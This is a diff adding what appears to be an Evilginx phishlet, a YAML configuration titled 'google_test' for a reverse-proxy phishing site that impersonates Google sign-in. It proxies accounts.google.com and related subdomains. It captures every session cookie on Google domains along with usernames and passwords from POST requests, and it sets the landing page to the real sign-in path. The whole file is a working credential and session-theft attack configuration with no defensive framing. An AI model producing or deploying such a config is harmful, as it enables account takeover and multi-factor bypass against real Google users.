@@ -1,0 +1,45 @@
+author: 'Spacey'
+min_ver: '3.3.0'  # Match banner.go version
+name: 'google_test'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+#  - {phish_sub: 'www2', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  # Add more as needed
+
+sub_filters:
+#  - {triggers_on: 'login.example.com', orig_sub: 'login', domain: 'example.com', search: 'pattern', replace: 'replacement', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['.*:regexp']
+    type: 'cookie'  # CRITICAL - don't forget this!
+  - domain: 'accounts.google.com'
+    keys: ['.*:regexp']
+    type: 'cookie'  # CRITICAL - don't forget this!
+  - domain: 'ogs.google.com'
+    keys: ['.*:regexp']
+    type: 'cookie'  # CRITICAL - don't forget this!
+  - domain: 'www.google.com'
+    keys: ['.*:regexp']
+    type: 'cookie'  # CRITICAL - don't forget this!
+
+auth_urls:
+  - '/CheckCookie'
+  - '/ManageAccount'
+
+credentials:
+  username:
+    key: 'email, account, login, UserName, username, DomainUser'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password, passwd, login_password, pass, pwd, session_password, PASSWORD'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin'
